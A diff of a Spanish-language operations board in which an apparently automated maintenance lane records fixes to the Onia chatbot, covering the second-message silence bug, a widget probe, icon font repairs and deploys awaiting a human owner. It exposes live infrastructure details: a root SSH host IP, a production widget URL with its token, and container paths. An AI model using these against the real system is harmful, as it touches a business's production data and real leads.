+      token, **no** de "la conversación más nueva del inbox": adivinarla haría que la sonda juzgue
+      la conversación de un lead de verdad.
+      ⚠️ **El contacto se llama `Sonda QA carril chatbot` a propósito.** `scripts/objetivo_visible.mjs`
+      excluye a los que somos nosotros con `/\b(prueba|qa|test)\b/i`; sin nombre, ese gate contaría
+      a esta sonda como "un desconocido escribió" y **el carril se declararía cumplido por su
+      propia sonda**. Hay un caso que lo afirma.
+      🔴 **Los tres falsos verdes que encontró el veredicto, y que un conteo ingenuo no ve.**
+      (1) Los `message_type = 3` son los enlatados del pre-chat: salen en el **mismo milisegundo**
+      que el entrante y salen **siempre**, también con el bot mudo — contarlos pinta de verde
+      exactamente el bug. (2) "Hubo 2 salientes" es verde con **dos respuestas al primer mensaje y
+      cero al segundo**, que es literalmente el bug de la semana: se cuenta **por turno**. (3) Una
+      respuesta tiene que venir después de **su** entrante y del más reciente, o una sola respuesta
+      da por contestados dos mensajes seguidos.
+      **Probado que MUERDE, y ahí aparecieron DOS casos que pasaban en falso.** Cuatro mutaciones;
+      en la primera pasada **sólo dos** se pusieron rojas. Las otras dos —"la saliente contesta
+      cualquier turno" y "juzgar el histórico entero"— sobrevivían porque los casos estaban mal
+      construidos: el de la saliente huérfana la ponía **antes** del primer entrante, donde no hay
+      turno abierto que ensuciar, y el del histórico ya venía rojo por otro motivo, así que el
+      veredicto no cambiaba. Reemplazados por los dos que sí muerden (*una respuesta no alcanza
+      para dos entrantes seguidos* y *un mudo de una vuelta vieja no deja el gate rojo para
+      siempre*). Ahora las **cuatro** mutaciones caen, cada una en **su propia** aserción.
+      **Un caso que no puede fallar no es un caso** — y el archivo tenía dos.
+      **Gates:** `test:sonda-widget` (11 casos) cableado a `npm test`, verificado **en rojo
+      primero**: `test:guards-cableados` mordió con *"estos tests existen y NO los corre nadie:
+      test:sonda-widget"* antes de cablearlo.
+      🔴 **La sonda mandó sus dos mensajes por primera vez el 2026-09-02 20:49 UTC, y el bot
+      contestó los DOS.** Conversación **49**, leída en la base de producción: entrante *"Hola,
+      quiero informacion sobre el sistema"* → `message_type=1`; entrante *"Tengo una clinica dental
+      en Santa Cruz, somos 4 personas"* → `message_type=1` *"Perfecto, anotado que te dedicás a
+      odontología, que son 4 personas…"*. **El bug de la semana no volvió**, y por primera vez eso
+      está medido en vez de supuesto.
+
+      **Esperar a la hora en punto era la salida equivocada, y estaba escrita acá.** Decía que el
+      cupo se recompone solo al minuto 3. Es cierto y no alcanza: deja la única prueba del carril
+      atada a que nadie haya corrido la sonda hace poco — una moneda, no un chequeo. La sonda ya
+      **no abre `/widget` limpio nunca**: mintea su `cw_conversation` con el propio
+      `Widget::TokenService` de Chatwoot vía `rails runner` (11 s medidos), y entra siempre por la
+      puerta que `rack_attack` no cuenta. `guionBootstrap()` y `tokenDeSalida()` están exportadas y
+      afirmadas: el token se saca **de entre** el ruido de WARN/INFO del runner, y si la marca no
+      está **explota** en vez de guardar una línea de log como si fuera un token.
+      Efecto de borde: el contacto se crea **ya nombrado** `Sonda QA carril chatbot`. Antes el
+      nombre se ponía por SQL al final, sólo si la vuelta llegaba viva hasta ahí, y **cada arranque
+      fallido dejaba un contacto anónimo en el inbox 4**, el de los leads de verdad — había 12 del
+      2026-09-02 (`misty-leaf-844`, `lingering-water-811`…). Verificado que **no contaminan el
+      objetivo**: los 395 contactos sin conversación del inbox 4 no los cuenta `objetivo:visible`,
+      que cuenta conversaciones; sigue diciendo 2 desconocidos (#37 mariohassen, #35 F).
+
+      Se cayeron dos hipótesis escritas, las dos por MIRAR la pantalla renderizada:
+      - **El widget no abre en la caja de texto.** Abre en una pantalla cuyo único `<button>` dice
+        **"Iniciar conversación"**; `#chat-input` recién se monta al tocarlo. Por eso expiraba el
+        localizador. Ni el iframe ni *"esperar a que monte el panel"* — lo que faltaba era **un
+        clic**. Con el clic la sonda mandó los dos mensajes.
+      - **El nombre corto del contenedor no existe.** En Swarm es
+        `onia-chatbot_chatwoot-db.1.nhgizxt2v01…`, con sufijo de réplica que cambia en cada
+        redeploy: `docker exec onia-chatbot_chatwoot-db` daba `No such container` **después** de
+        mandar los mensajes, o sea gastaba la medición para no medir nada. Ahora los dos
+        contenedores se resuelven por prefijo con `docker ps --filter`.
+
+      🔴 **Lo único que queda, con su reproducción exacta:** correr `npm run sonda:widget` **una
+      segunda vez**, con la conversación 49 ya existente, vuelve a salir **2** con
+      *"waiting for locator('#chat-input')"*. La primera corrida (sin conversación) sí pasa. La
+      hipótesis —**no verificada, no la anuncies sin mirarla**— es que con conversación previa el
+      widget ya no muestra "Iniciar conversación" y monta otra pantalla. Se reproduce en 30 s:
+      abrir la URL del widget con el `cw_conversation` de `/root/.onia/sonda-widget.json`,
+      `document.body.innerText` y la lista de `<button>`. **Mirarla antes de tocar el selector.**
+
+✅ **"Ahora" tiene combustible, y las dos veces salió de MIRAR el sistema vivo, no de la cola**: el
+`bot-engine` sin versionar salió de comparar el repo contra producción, y la sonda rota salió de
+intentar correr el chequeo de "hecho". Lo de abajo describe la
+vuelta anterior, cuando el carril sí estaba vacío, y explica por qué mirar el sistema vivo es lo
+que lo destraba.
+
+⚠️ **"Ahora" seguía sin ítems sin empezar: el carril estaba sin combustible.** Los tres de "Después"
+no son promovibles y no es trámite — el del disco es de la máquina Windows de Sergio y el propio
+ítem dice que no lo arregla este carril; la data QA es un "no borrar todavía" deliberado; el QR
+espera al banco (**S2**). Las 14 filas de "Bloqueado en Sergio" esperan a Sergio, y las que una
+máquina puede medir ya se miden solas. Lo que destraba el carril es **S14** (darle org al inbox 4:
+hay seis conversaciones de desconocidos que nadie puede abrir, cinco sin teléfono ni correo) y
+**S12** (los dos horarios de demo, sin los cuales el bot contesta una vez y se calla). Los dos son
+decisión de Sergio, no código.
+
+> Los tres de "Después" siguen sin subir, y no es trámite: ninguno está frenado por código. El
+> disco es de la máquina Windows de Sergio y el ítem mismo dice que no lo arregla este carril —
+> medido en el VPS, que es donde corre este loop: 72 % de uso, 56 GB libres y **2** worktrees
+> de `onia-platform`, no 30. La data QA es "no borrar todavía". El QR espera al banco (**S2**).
 
 ---
+
+- [x] ✅ **RESUELTO el 2026-09-02 — el bot contesta el segundo mensaje.** La causa se sacó
+      corriendo el motor contra el caso, no leyendo código: `MSG1 → stage handoff_humano, notes
+      ["bienvenida","sin_horarios_que_ofrecer"]` · `MSG2 → replies 0, notes
+      ["silencio:handoff_en_curso"]`. Sin Cal.com instalado, los slots de `config.mjs` siguen en
+      *"HORARIO A (pendiente de definir)"*, así que `slotsPending` es SIEMPRE true y
+      `welcomeResult` mandaba **toda** conversación a `handoff_humano` — que es silencio
+      permanente. Y no había humano.
+      **Lo más caro fue el test que lo protegía:** `knowledge.test.mjs` verificaba que el mensaje
+      de bienvenida fuera correcto y **exigía `handoff_humano`**. Verde, y la conversación moría.
+      Un test que mira el primer mensaje no puede ver un bot que enmudece en el segundo.
+      **Arreglado:** `esperando_horario` (la rama viva) + `M0b_SIN_HORARIOS`, que acusa el dato y
+      pide el contacto en vez de re-ofrecer un horario que no existe. 689 tests verdes, test nuevo
+      que falla en rojo antes. Desplegado a `/opt/onia/bot` y **verificado en el widget real**.
+      ⏭️ **Queda lo otro, y es de Sergio:** definir los dos horarios o instalar Cal.com (tablero
+      `t_af8f44ad`). Hasta entonces el bot dice la verdad — "Sergio te coordina el horario".
+
+- [x] ~~🔴 **El bot contesta el saludo y se calla en el SEGUNDO mensaje. Reproducido hoy, en vivo, en el inbox de los leads reales.**
+      **Cómo se reproduce** (30 segundos, sin tocar nada): abrir
+      `https://onia-chatbot-chatwoot.hqdqgh.easypanel.host/widget?website_token=9k5i7xnAgCbSse1EZwVChZLw`,
+      escribir *"Hola, quiero informacion sobre el sistema"* → **contesta bien**; después
+      *"Tengo una clinica dental en Santa Cruz, somos 4 personas"* → **nada, nunca**.
+      **No es infraestructura.** Medido: `/health` dentro de `onia-center` da `ok:true`, base a
+      32 ms, el camino a Chatwoot responde, el webhook está registrado en la cuenta 2 sin filtro
+      de inbox (o sea que cubre el 4), y no hay incidente abierto.
+      **Tampoco es el add-on.** Se probó la hipótesis y salió FALSA: se le otorgó
+      `addon.whatsapp` a `onia-interna` (activo, verificado en `organization_entitlements`) y el
+      bot se sigue callando igual. Queda otorgado.
+      **El patrón, contado sobre las 13 conversaciones desde el 24-ago:** en el inbox 7 (QA) el
+      bot sostuvo una charla entera (5 mensajes → 5 respuestas). En los inboxes 4 y 5 —los de
+      leads reales— contestó **como máximo UNA vez, siempre**: 1→0, 1→0, 2→0, 1→0, 1→1, 2→1,
+      2→1, 2→1. Nunca hubo una segunda respuesta a una persona real.
+      🔴 **Lo primero es VERLO, no adivinarlo.** `/tmp/onia-bot-webhook.log` sólo tiene líneas de
+      arranque: **ni una por mensaje**. El proceso corre con `docker exec -d`, así que su salida
+      no va a ningún lado. Por eso este bug sobrevivió una semana con cinco personas escribiendo.
+      **Antes de tocar el motor: que cada webhook deje una línea** con conversación, entrada, la
+      rama que tomó y por qué no respondió. Con eso la causa aparece en la primera vuelta; sin
+      eso se sigue adivinando.
+      ⚠️ **Ojo con dar por buena una hipótesis sin probarla**: la del add-on parecía cerrada y era
+      falsa. La conversación de prueba de hoy queda en el inbox 4 a propósito, para reproducir.
 
 ## Después
 
@@ -207,16 +666,15 @@ envejece; esto no.** Hoy sale **1** por **S16**.
   ```bash
   ssh root@187.77.16.63 "docker exec onia-center sh -c 'grep -c campanas /tmp/onia-bot/knowledge.json'"
   ```
-  Tiene que dar **≥1**. Hoy da **0** dentro y fuera del contenedor (904 bytes del 6-ago), que es el estado sin S9. (Se suma al mismo `scp` `recepcionista.test.mjs`, que dejó de ser un archivo de 0 bytes — es un test, no cambia lo que corre.) ✅ **Sumado el 31-ago (10ª vuelta) — verificación PREVIA, que antes no existía:** `npm run campanas:vivas` mide **desde la calle** que el documento cubra las frases que onia.com.bo manda **hoy**. Si sale 1, el `scp` publicaría un documento que ya no matchea y no hay que hacerlo. Corrido hoy: **0** (5 de 5 cubiertas). No reemplaza al `grep -c campanas` de después — ese mide el VPS, este mide el documento. 🔴 **CORREGIDO el 2026-09-02 (auditoría de los `[x]`): S9 volvió a quedar corto, y hacerlo como dice HOY deja el motor llamando a una función que no existe.** Desde que se escribió "viajan TRES archivos", el espejo sumó una feature entera —el bot manda el link de la agenda pública de la org en vez de derivar— repartida en **cinco** archivos. Medido contra `/opt/onia/bot` real, no leído: `espejo-check` nombra ahora `config.mjs`, `intents.mjs` y `preview-route.mjs` **además** de `knowledge.mjs` y `recepcionista.mjs`. Y el acople es duro: el `recepcionista.mjs` del espejo llama a `intents.wantsToBook()` y a la plantilla `R_AGENDA`, y **ninguna de las dos existe en el VPS** (su `intents.mjs` exporta `wantsToOrder` pero no `wantsToBook`; su `config.mjs` tiene cero `R_AGENDA`). Probado ejecutando, no por grep: copiado el subconjunto que S9 mandaba a un `/tmp` con el resto del VPS, `intents.wantsToBook` da `undefined` y llamarlo tira `TypeError: intents.wantsToBook is not a function`. **La lista vigente de S9 = `bot-engine.mjs`(ya en sync) + `config.mjs` + `intents.mjs` + `knowledge.mjs` + `preview-route.mjs` + `recepcionista.mjs` + el documento `knowledge.json`** — y la manda el gate, no este párrafo: `espejo-check.mjs` ahora imprime `VIAJAN JUNTOS` con los acoples calculados en vivo. Correr el gate ANTES del `scp` y copiar lo que diga; esta lista envejece, la del gate no. |
-| S10 | **Aplicar al VPS la defensa ampliada de la marca de Chatwoot** — `scp` de `hermes-content/deploy/vps-ops/chatwoot-brand-onia.sh` a `/root/bin/` y una corrida manual. Repara **DIEZ** `installation_configs` que Chatwoot reconcilia solo (`Internal::ReconcilePlanConfigService`, leído del YML del propio contenedor): el cron que hoy corre (`/root/bin/chatwoot-brand-onia.sh`, cada hora al minuto :17) sólo reaplica 3 de las 9 que le tocan (DISPLAY_MANIFEST queda afuera a propósito: su valor de fábrica es el que se quiere) | Reemplaza un cron que corre solo cada hora: es infra, y la regla del carril dice que el VPS es suyo | Que `BRAND_URL`, `TERMS_URL` y `PRIVACY_URL` dejen de decir `www.chatwoot.com` en el HTML público del login. Se mide **desde la calle, sin VPS ni SSH**: `npm run marca:chatwoot` (`hermes-content/deploy/vps-ops/chatwoot-marca-publica.mjs`, 8 tests) lee `window.globalConfig` del login público — antes de que existiera este gate, la reversión del 16-ago vivió quince días sin que nadie la viera, porque el único chequeo vivía dentro del contenedor. **Re-verificado en vivo el 2026-09-02: sigue en `REVERTIDAS 3/9`, exit 1**, sin cambio desde el 16-ago (ya se vigiló así ocho vueltas seguidas entre el 31-ago y hoy, siempre con el mismo resultado). **Después del `scp` y la corrida manual, tiene que salir 0** — ése es el verificador de S10 |
-| S11 | **Desplegar el producto para que el sidebar deje de mostrar `ASSIGNMENT_TURNED_IN` en letras gigantes.** El arreglo es el commit **`22fd088`** de `onia-platform`, rama `claude/chatbots-platform-review-0d1d09` — **commiteado y pusheado, pero NO llega a `master`: ver S16.** 🔴 **Corregido el 2026-09-02 (auditoría de los `[x]`, tercera vuelta): "commiteado y pusheado" NO alcanza, y escribirlo así volvía a dejar el bloqueo sin salida.** `onia-platform` se despliega buildeando **`origin/master`** (medido en la §20 del radar: producción corre `8a3b5a6`, un build de `master`), y `22fd088` **no está en `master`** — vive sólo en la rama del carril, que está 2 adelante y 17 atrás y que nadie mergea. Con el OK dado, el swap buildea `master`, el icono sigue roto y el bloqueo se cierra en falso. **Es la tercera vez que esta misma fila se queda corta**: primero el commit no existía, después existía sin estar mergeado. Por eso la lista ya no la mantiene este párrafo: `npm run deploy:alcanzable` se lo pregunta a git | Es un deploy del producto, y ningún deploy sale sin su OK | Que el ítem "Requerimientos" del menú dibuje su icono. 🔴 **CORREGIDO el 2026-09-02 (auditoría de los `[x]`): esta fila mandaba a desplegar un commit que NO EXISTE.** Decía *"commit `4f86381` (rama `carril/chatbot-v68-friccion`)"* y *"ya arreglado y con su guardia en la suite (`scripts/iconos-en-la-fuente.test.ts`)"*. Medido, no leído: después de `git fetch --all --prune` contra GitHub, `git log 4f86381` da `unknown revision`, **no hay ninguna rama** que matchee `friccion` ni `v68` en las 39 remotas, y el archivo del guardia **nunca fue agregado en ninguna rama**. Ese trabajo quedó en el disco de Windows y nunca se pusheó. Un bloqueo que le pide a Sergio desplegar la nada es peor que un fantasma: no se destraba nunca. **El defecto SÍ era real y seguía vivo**, verificado RENDERIZANDO el `.woff2` que se publica (Chromium, no grep): `assignment_turned_in` mide **20em** —el texto crudo— contra **1em** de los otros 34 iconos del menú. Causa medida: el icono entró el 30-ago (`ab9e0de`) y la fuente subseteada es del 29-ago (`917adca`), así que el glifo nunca viajó; y `scripts/subset-iconos.mjs`, que corre dentro del `build`, **se rinde en silencio y sale 0** si falta `pyftsubset` (reproducido acá). **Rehecho de cero en `22fd088`:** el ítem usa `task_alt`, que ya está en el subset (no depende de que exista Python en el entorno de build), más el gate `npm run gate:iconos` (`scripts/iconos-en-la-fuente.mjs`) que renderiza los 35 iconos declarados contra la fuente publicada **sin sesión ni app levantada** — el hueco exacto por el que se coló, ya que `e2e/iconos.spec.ts` sólo mira `/`, `/login` y `/register`. Rojo por el motivo correcto antes, verde después (35/35). Gates: `tsc` limpio · **2441** tests · `eslint` 0 errores. **Verificación post-deploy:** abrir `/inbox` y mirar el menú — el ítem "Requerimientos" tiene que dibujar un tilde, no una palabra |
+  Tiene que dar **≥1**. Hoy da **0** dentro y fuera del contenedor (904 bytes del 6-ago), que es el estado sin S9. (Se suma al mismo `scp` `recepcionista.test.mjs`, que dejó de ser un archivo de 0 bytes — es un test, no cambia lo que corre.) ✅ **Sumado el 31-ago (10ª vuelta) — verificación PREVIA, que antes no existía:** `npm run campanas:vivas` mide **desde la calle** que el documento cubra las frases que onia.com.bo manda **hoy**. Si sale 1, el `scp` publicaría un documento que ya no matchea y no hay que hacerlo. Corrido hoy: **0** (5 de 5 cubiertas). No reemplaza al `grep -c campanas` de después — ese mide el VPS, este mide el documento. 🔴 **CORREGIDO el 2026-09-02 (auditoría de los `[x]`): S9 volvió a quedar corto, y hacerlo como dice HOY deja el motor llamando a una función que no existe.** Desde que se escribió "viajan TRES archivos", el espejo sumó una feature entera —el bot manda el link de la agenda pública de la org en vez de derivar— repartida en **cinco** archivos. Medido contra `/opt/onia/bot` real, no leído: `espejo-check` nombra ahora `config.mjs`, `intents.mjs` y `preview-route.mjs` **además** de `knowledge.mjs` y `recepcionista.mjs`. Y el acople es duro: el `recepcionista.mjs` del espejo llama a `intents.wantsToBook()` y a la plantilla `R_AGENDA`, y **ninguna de las dos existe en el VPS** (su `intents.mjs` exporta `wantsToOrder` pero no `wantsToBook`; su `config.mjs` tiene cero `R_AGENDA`). Probado ejecutando, no por grep: copiado el subconjunto que S9 mandaba a un `/tmp` con el resto del VPS, `intents.wantsToBook` da `undefined` y llamarlo tira `TypeError: intents.wantsToBook is not a function`. **La lista vigente de S9 = `bot-engine.mjs`(ya en sync) + `config.mjs` + `intents.mjs` + `knowledge.mjs` + `preview-route.mjs` + `recepcionista.mjs` + el documento `knowledge.json`** — y la manda el gate, no este párrafo: `espejo-check.mjs` ahora imprime `VIAJAN JUNTOS` con los acoples calculados en vivo. Correr el gate ANTES del `scp` y copiar lo que diga; esta lista envejece, la del gate no. **Verificador:** `node hermes-content/deploy/vps-ops/bot/espejo-check.mjs` → 0 |
+| S10 | **Aplicar al VPS la defensa ampliada de la marca de Chatwoot** — `scp` de `hermes-content/deploy/vps-ops/chatwoot-brand-onia.sh` a `/root/bin/` y una corrida manual. Repara **DIEZ** `installation_configs` que Chatwoot reconcilia solo (`Internal::ReconcilePlanConfigService`, leído del YML del propio contenedor): el cron que hoy corre (`/root/bin/chatwoot-brand-onia.sh`, cada hora al minuto :17) sólo reaplica 3 de las 9 que le tocan (DISPLAY_MANIFEST queda afuera a propósito: su valor de fábrica es el que se quiere) | Reemplaza un cron que corre solo cada hora: es infra, y la regla del carril dice que el VPS es suyo | Que `BRAND_URL`, `TERMS_URL` y `PRIVACY_URL` dejen de decir `www.chatwoot.com` en el HTML público del login. Se mide **desde la calle, sin VPS ni SSH**: `npm run marca:chatwoot` (`hermes-content/deploy/vps-ops/chatwoot-marca-publica.mjs`, 8 tests) lee `window.globalConfig` del login público — antes de que existiera este gate, la reversión del 16-ago vivió quince días sin que nadie la viera, porque el único chequeo vivía dentro del contenedor. **Re-verificado en vivo el 2026-09-02: sigue en `REVERTIDAS 3/9`, exit 1**, sin cambio desde el 16-ago (ya se vigiló así ocho vueltas seguidas entre el 31-ago y hoy, siempre con el mismo resultado). **Después del `scp` y la corrida manual, tiene que salir 0.** **Verificador:** `npm run marca:chatwoot` → 0 |
+| S11 | **Desplegar el producto para que el sidebar deje de mostrar `ASSIGNMENT_TURNED_IN` en letras gigantes.** El arreglo es el commit **`22fd088`** de `onia-platform`, rama `claude/chatbots-platform-review-0d1d09`. ✅ **Ya está en `origin/master`** desde el merge `503af44` (2026-09-02 12:38 UTC), así que **el deploy hoy SÍ lo alcanza** — durante horas esta fila decía lo contrario y por eso no se destrababa. **Falta sólo el swap**, y el defecto sigue vivo en producción: el contenedor `onia-platform` lleva 15 h arriba (anterior al merge) y su build todavía tiene `assignment_turned_in` — medido con `docker exec … grep -rl` sobre `/app/.next`, no leído. Esta fila se quedó corta tres veces (el commit no existía · existía sin mergear · mergeado pero la fila decía que no); por eso la lista ya no la mantiene este párrafo: `npm run deploy:alcanzable` se lo pregunta a git, y hoy sale **0**. **Y desde el 2026-09-02 esta fila se comprueba sola: `npm run s11:desplegado` le pregunta al contenedor `onia-platform` del VPS —el que CORRE, no el host ni el repo— con qué icono dibuja hoy la entrada `/requerimientos` de su build publicado. Hoy sale 1 nombrando `assignment_turned_in`; el día que Sergio haga el swap sale 0 y `npm run bloqueos:vencidos` levanta la fila solo, sin que nadie se acuerde de mirar. **Verificador:** `npm run s11:desplegado` → 0** | Es un deploy del producto, y ningún deploy sale sin su OK | Que el ítem "Requerimientos" del menú dibuje su icono. 🔴 **CORREGIDO el 2026-09-02 (auditoría de los `[x]`): esta fila mandaba a desplegar un commit que NO EXISTE.** Decía *"commit `4f86381` (rama `carril/chatbot-v68-friccion`)"* y *"ya arreglado y con su guardia en la suite (`scripts/iconos-en-la-fuente.test.ts`)"*. Medido, no leído: después de `git fetch --all --prune` contra GitHub, `git log 4f86381` da `unknown revision`, **no hay ninguna rama** que matchee `friccion` ni `v68` en las 39 remotas, y el archivo del guardia **nunca fue agregado en ninguna rama**. Ese trabajo quedó en el disco de Windows y nunca se pusheó. Un bloqueo que le pide a Sergio desplegar la nada es peor que un fantasma: no se destraba nunca. **El defecto SÍ era real y seguía vivo**, verificado RENDERIZANDO el `.woff2` que se publica (Chromium, no grep): `assignment_turned_in` mide **20em** —el texto crudo— contra **1em** de los otros 34 iconos del menú. Causa medida: el icono entró el 30-ago (`ab9e0de`) y la fuente subseteada es del 29-ago (`917adca`), así que el glifo nunca viajó; y `scripts/subset-iconos.mjs`, que corre dentro del `build`, **se rinde en silencio y sale 0** si falta `pyftsubset` (reproducido acá). **Rehecho de cero en `22fd088`:** el ítem usa `task_alt`, que ya está en el subset (no depende de que exista Python en el entorno de build), más el gate `npm run gate:iconos` (`scripts/iconos-en-la-fuente.mjs`) que renderiza los 35 iconos declarados contra la fuente publicada **sin sesión ni app levantada** — el hueco exacto por el que se coló, ya que `e2e/iconos.spec.ts` sólo mira `/`, `/login` y `/register`. Rojo por el motivo correcto antes, verde después (35/35). Gates: `tsc` limpio · **2441** tests · `eslint` 0 errores. **Verificación post-deploy:** abrir `/inbox` y mirar el menú — el ítem "Requerimientos" tiene que dibujar un tilde, no una palabra |
 | S12 | **Los DOS horarios fijos de demo — sin ellos el bot deriva a un humano en el primer mensaje y se calla para siempre.** Son dos bloques semanales de SU agenda; `hermes-content/deploy/vps-ops/bot/config.mjs` los trae `pending: true` con un TODO que dice *"PROHIBIDO inventar horarios acá"*. **Contexto nuevo del 01-sep:** existía la salida automática por Cal.com y **está muerta** — no hay contenedor de Cal.com en el VPS y `cal.onia.com.bo` responde 302 a `onia.com.bo/empezar`, así que el módulo cae al placeholder en silencio. **Dos opciones, las dos baratas:** (a) Sergio dicta dos bloques fijos (ej. martes 10:00 y jueves 16:00) y quedan como dato — cero código; (b) revivir Cal.com, que es infra y cuesta más. Recomendación: **(a)**, y (b) después si molesta mantenerlos a mano | Son horas de su semana, y el código prohíbe inventarlas | **El ítem 1 de Ahora, que es el único defecto que un comprador ve.** Probado corriendo el motor con dos horarios cualesquiera: el embudo llega hasta `M2` demo agendada sin tocar una línea de código |
 | S13 | **Encender el aviso `notify_sergio`** — hoy el bot pide un humano y no se entera nadie. ⚠️ **NO es "poner `ONIA_N8N_ENABLED=true`"**: `ONIA_N8N_EVENT_URL` está **vacío** y **no existe ningún workflow de n8n** que reciba el evento (listados los 44). Con la variable en `true` y sin URL el envío devuelve `failed` y **nadie se entera**, porque es fire-and-forget a propósito. **Decidir el camino:** (a) Telegram directo desde el bot, reusando el `TG_BOT_TOKEN` que `hermes-content/deploy/vps-ops/bot/webhook-watchdog.sh` ya usa en el VPS — sin workflow, sin URL, sin secreto nuevo; (b) crear el workflow de n8n y cargar la URL. Recomendación: **(a)** | Escribe en el VPS. El código lo escribe este carril; la decisión y el deploy son suyos | El ítem 2 de Ahora. Gate barato antes de mirar el celular: `"configurado":true` en el `/health` del bot |
-| S14 | **De quién es la bandeja del widget (inbox 4)** — hoy no tiene org y por ahí entraron **5 de las 9** conversaciones de desconocidos, incluida la del 01-sep. ⚠️ **A diferencia de S8, no alcanza con dos clicks:** está cerrado en esta cola que **una org sólo puede tener UN inbox**, y `Onia (interna)` ya gastó el suyo en el 5. **Opciones:** (a) darle el inbox 4 a otra org existente — cero código, pero mezcla el widget de Onia con una org que no es Onia; (b) crear una org `Onia (web)` sólo para el widget — cero código; (c) levantar la restricción de un inbox por org, que es código del producto y de otro carril. Recomendación: **(b)** | Es decidir en qué bandeja aterrizan los desconocidos de la web | **La otra mitad del objetivo del carril.** Hecho = se abre `/inbox` y se ve la conversación 45 (*"tengo una ferreteria"*) |
+| S14 | **De quién es la bandeja del widget (inbox 4)** — hoy no tiene org, y por ahí entraron **SEIS** conversaciones de desconocidos (34, 36, 38, 40, 45, 46), dos de ellas del 01-sep. **Cinco de las seis no dejaron teléfono ni correo**: sólo se les puede contestar desde adentro del widget, que es exactamente lo que el inbox huérfano impide — o sea que un inbox sin dueño no es una demora, es una pérdida. ⚠️ **A diferencia de S8, no alcanza con dos clicks:** está cerrado en esta cola que **una org sólo puede tener UN inbox** (`clinic_settings.chatwootInboxId`, `prisma/schema.prisma:1002`), y `Onia (interna)` ya gastó el suyo en el 5. ⚠️ **Corregido el 2026-09-02:** acá decía que esa columna era *"un `Int?` **único**"* y es falso — medido, no leído: no tiene `@unique` ni hay `@@unique` en `ClinicSettings`. Lo cierto de la frase es la mitad que importa para esta decisión (una org tiene UN inbox, porque es una columna escalar); lo que NO garantiza nadie es el otro sentido — **la base acepta que dos orgs reclamen el mismo inbox**, y el 409 que lo impide vive sólo en el PATCH de superadmin. No cambia las tres opciones de abajo, pero sí descarta "la base no me deja" como argumento. Desde hoy lo vigila `npm run inbox:tenencia`. **Opciones ya cotizadas en `ONIA_RADAR_DECISIONES_PRODUCTO.md` §9:** (a) darle el inbox 4 a otra org existente — cero código, pero mezcla el widget de Onia con una org que no es Onia; (b) crear una org `Onia (web)` sólo para el widget — cero código, ~10 min, agrega una org fantasma; (c) extender `clinic_settings` a N inboxes, que es código del producto y de otro carril. Recomendación: **(b)**. 🔁 **Fusionada el 2026-09-02 con la fila que la tabla listaba aparte bajo un SEGUNDO `S12`** (*"¿sigue en pie la opción 1 de §9?"*): era la **misma decisión preguntada dos veces**, con dos números distintos y uno de ellos ya usado por los horarios de demo. Lo destapó `npm run bloqueos:vencidos` al imprimir `S12, S12` — el gate nombra las filas por su id, así que un id repetido lo vuelve ambiguo. El dato fresco que aportaba esa fila (seis conversaciones, cinco sin contacto) es justo el que le faltaba a la condición de §9 *"hasta que la limitación moleste"*, y ya vive acá. **Y el `5 de las 9` que esta fila decía estaba viejo**: eran seis. | Es decidir en qué bandeja aterrizan los desconocidos de la web | **La otra mitad del objetivo del carril.** Hecho = se abre `/inbox` y se ve la conversación 45 (*"tengo una ferreteria"*) |
 | S15 | **Una credencial de sólo lectura para que el canario ENTRE al panel del chatbot** — un usuario del producto (correo + contraseña) que sólo mire. Se enchufa como `ONIA_CANARIO_USER` / `ONIA_CANARIO_PASS` en el entorno del loop `canario-visual`; **no hay una línea de código pendiente**: `requiereSesion` y `iniciarSesion()` ya están en `scripts/canario_visual.mjs` y entran por el formulario real de `/login`. Sin ella el canario NO miente (desde hoy dice `NO MEDIDA` con el motivo), pero **la pantalla que un cliente usa para editar su conocimiento sigue sin que nadie la mire nunca**. ⚠️ La otra opción que el ítem original proponía —una ruta de vista previa pública— **se descarta**: expone configuración de cliente sin sesión, y es agregar una superficie viva | Es un alta de usuario en producción, y una contraseña | Que `/settings/chatbot` entre a la ronda del canario como las otras diez. Hecho = el canario imprime `panel-chatbot … sin disparo mecanico` y su baseline se crea con `urlFinal` = `/settings/chatbot` |
-| S16 | **Los arreglos de este carril al producto no llegan a `master`, así que ningún deploy los puede alcanzar.** Medido el 2026-09-02 con `git merge-base --is-ancestor`, no leído: `22fd088` (el icono roto del menú, **S11**) y `675541b` (el editor que le dice "consultorio" a una ferretería) están pusheados a `origin/claude/chatbots-platform-review-0d1d09` de `onia-platform` y **NO** están en `origin/master`, que es de donde se buildea. ⚠️ **Ya son TRES, y el tercero muestra que esto no es sólo un problema de deploy:** se suma `d62beeb`, que cablea `gate:iconos` a la cadena `ci`. Ése no necesita un swap en el VPS —es un `package.json` y un test— pero **sí** necesita estar en `master` para que el CI de `master` lo corra. Mientras no llegue, la guarda que impide que otro icono salga como palabra en el menú **no protege a la rama de la que se buildea**. Cada vuelta que este carril arregla algo del producto, la pila crece. **Causa, y es de procedimiento, no de código:** el integrador (`onia-cola`) tiene el merge a `master` pre-autorizado por su propio prompt, pero su Paso 1 recorre las ramas de **`onia-hermes`**; la rama homónima de `onia-platform` no la mira nadie, y contra el `main` de `onia-hermes` da 0, así que concluye "nada que hacer". Opciones cotizadas en el radar §23: **(a)** que `onia-cola` extienda su Paso 1 al segundo repo — toca `scripts/loops/prompts/onia-cola.md`, que es del carril de integración y **no de éste**; **(b)** mergear la rama a mano o por PR, como llegaron los últimos; **(c)** dejarlo, y S11 no se destraba nunca. Recomendación: **(a)**, y (b) ya si se quiere el icono en el próximo swap | Es elegir entre cambiar el procedimiento del integrador o mergear a mano — y `master` es rama protegida de este loop | **S11 entero**, y todo arreglo futuro de este carril sobre el producto. Verificador: `npm run deploy:alcanzable` tiene que salir **0**; hoy sale **1** nombrando los dos |
+| ~~S16~~ | ✅ **VENCIDO el 2026-09-02 — Sergio no decide nada: la decisión ya se tomó y el trabajo ya llegó.** Pedía elegir entre cambiar el procedimiento del integrador, mergear a mano, o dejarlo. Pasaron **las dos primeras**: el integrador arregló su Paso 1 (`d26444c1` de `onia-hermes`, *"contaba las ramas contra el repo equivocado"*) y mergeó el carril a `master` de `onia-platform` (`503af44`, 12:38 UTC). Verificado con `git fetch` fresco y `merge-base --is-ancestor`: **los cuatro** commits declarados (`22fd088`, `675541b`, `d62beeb`, `e644c85`) llegan a `origin/master`; `npm run deploy:alcanzable` sale **0**. El radar §23 ya figuraba **RESUELTO** — sólo esta fila seguía pidiendo la decisión. Detalle en el primer ítem de "Cerrado". | — | — |
